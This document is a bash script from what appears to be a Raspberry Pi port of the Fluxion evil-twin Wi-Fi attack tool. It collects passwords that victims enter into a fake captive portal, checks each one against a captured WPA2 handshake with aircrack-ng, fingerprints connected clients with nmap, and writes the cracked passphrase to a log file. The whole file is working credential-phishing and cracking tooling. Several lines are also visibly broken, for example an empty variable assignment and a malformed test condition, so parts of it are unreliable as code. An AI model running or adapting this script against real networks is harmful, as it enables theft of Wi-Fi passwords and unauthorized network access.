#!/bin/bash

function handle_abort_authenticator() {
	AuthenticatorState="aborted"
}

echo > "/tmp/fluxpi/captive_portal/candidate.txt"
echo -n "0"> "/tmp/fluxpi/captive_portal/hit.txt"

# Make console cursor invisible, cnorm to revert.
tput civis
clear

m=0
h=0
s=0
i=0

AuthenticatorState="running"

startTime=$(date +%s)

if [ ! -f /tmp/fluxpi/captive_portal/ip_hits ];then
	touch /tmp/fluxpi/captive_portal/ip_hits
fi

while [ $AuthenticatorState = "running" ]; do
	let s=$(date +%s)-$startTime

	d=`expr $s / 86400`
	s=`expr $s % 86400`
	h=`expr $s / 3600`
	s=`expr $s % 3600`
	m=`expr $s / 60`
	s=`expr $s % 60`

	if [ "$s" -le 9 ]; then
		is="0"
	else
		is=
	fi

	if [ "$m" -le 9 ]; then
		im="0"
	else
		im=
	fi

	if [ "$h" -le 9 ]; then
		ih="0"
	else
		ih=
	fi

	if [ -f "/tmp/fluxpi/captive_portal/pwdattempt.txt" -a -s "/tmp/fluxpi/captive_portal/pwdattempt.txt" ]; then
		# Assure we've got a directory to store pwd logs into.
		if [ ! -d "/tmp/fluxpi/captive_portal/pwdlog" ]; then
			mkdir -p "/tmp/fluxpi/captive_portal/pwdlog"
		fi

		# Save any new password attempt.
		cat "/tmp/fluxpi/captive_portal/pwdattempt.txt" >> "/tmp/fluxpi/captive_portal/pwdlog/network.log"

		# Save ips to file
		echo -e n >> "/tmp/fluxpi/captive_portal/pwdlog/network-IP.log"
		
		# Clear logged password attempt.
		echo -n > "/tmp/fluxpi/captive_portal/pwdattempt.txt"
	fi


	if [ -f "/tmp/fluxpi/captive_portal/candidate_result.txt" ]; then
		# Check if we've got the correct password by looking for anything other than "Passphrase not in".
		if ! aircrack-ng -w "/tmp/fluxpi/captive_portal/candidate.txt" "/tmp/fluxpi/network.cap" | grep -qi "Passphrase not in"; then
			if [ -f /tmp/fluxpi/ip_hits ];then
				MatchedClientIP=
	
				if [  !=  ];then
					MatchedClientMAC=$(nmap -PR -sn -n $MatchedClientIP 2>&1 | grep -i mac | awk '{print $3}' | tr [:upper:] [:lower:])
	
					if [ "$(echo $MatchedClientMAC| wc -m)" != "18" ]; then
						MatchedClientMAC="xx:xx:xx:xx:xx:xx"
					fi
	
					VICTIM_FABRICANTE=$(macchanger -l | grep "$(echo "$MatchedClientMAC" | cut -d ":" -f -3)" | cut -d " " -f 5-)
			        if echo $MatchedClientMAC| grep -q x; then
			                VICTIM_FABRICANTE="unknown"
		            fi
		        else
		        	MatchedClientIP=Unknown
		        	MatchedClientMAC=Unknown
		        fi
		    fi

            echo "2" > "/tmp/fluxpi/captive_portal/candidate_result.txt"

			sleep 1
			break

		else
			echo "1" > "/tmp/fluxpi/captive_portal/candidate_result.txt"
		fi
	fi

	DHCPClients=()

	echo
	echo -e "  ACCESS POINT:"
	echo -e "    SSID ...........: \e[0;37m$1\e[0m"
	echo -e "    Channel ........: \e[0;37m$2\e[0m"
	echo -e "    Runtime ........: \e[0;34m$ih$h:$im$m:$is$s\e[0m"
	echo -e "    Attempts .......: \e[0;31m$(cat /tmp/fluxpi/captive_portal/hit.txt)\e[0m"
	echo -e "    Clients ........: \e[0;34m$(cat /tmp/fluxpi/captive_portal/clients.txt | grep DHCPACK | awk '{print $5}' | sort| uniq | wc -l)\e[0m"
	echo
	echo -e "  CLIENTS ONLINE:"

	x=0
	for client in "${DHCPClients[@]}"; do
		x=$(($x+1))

		ClientIP=$(echo $client| cut -d " " -f2)
		ClientMAC=$(nmap -PR -sn -n $ClientIP 2>&1 | grep -i mac | awk '{print $3}' | tr [:upper:] [:lower:])

		if [ "$(echo $ClientMAC| wc -m)" != "18" ]; then
			ClientMAC="xx:xx:xx:xx:xx:xx"
		fi

		ClientMID=$(macchanger -l | grep "$(echo "$ClientMAC" | cut -d ":" -f -3)" | cut -d " " -f 5-)

		if echo $ClientMAC| grep -q x; then
			ClientMID="unknown"
		fi

		ClientHostname=$(grep $ClientIP "/tmp/fluxpi/captive_portal/clients.txt" | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print $2}' | awk -F ')' '{print $1}')

		echo -e "    \e[0;32m $x) \e[0;31m$ClientIP \e[0;33m$ClientMAC \e[0m(\e[0;34m$ClientMID\e[0m) \e[0;32m $ClientHostname\e[0m"
	done

	echo -ne "\033[K\033[u"

	sleep 1

done

if [ $AuthenticatorState = "aborted" ]; then exit 1; fi

clear
echo "1" > "/tmp/fluxpi/captive_portal/status.txt"

# sleep 7
sleep 3


# Assure we've got a directory to store net logs into.
if [ ! -d "/tmp/fluxpi/captive_portal/netlog" ]; then
	mkdir -p "/tmp/fluxpi/captive_portal/netlog"
fi

echo "
FLUXION 3

SSID: $1
Channel: $2
Security: WPA2
Time: $ih$h:$im$m:$is$s
Password: $(cat /tmp/fluxpi/captive_portal/candidate.txt)
Mac: 
IP: 
" >"/home/pi/network.log"

aircrack-ng -a 2 -0 -s "/tmp/fluxpi/network.cap" -w "/tmp/fluxpi/captive_portal/candidate.txt" && echo && echo -e "The password was saved in \e[0;31m/home/pi/network.log\e[0m"
killall xterm
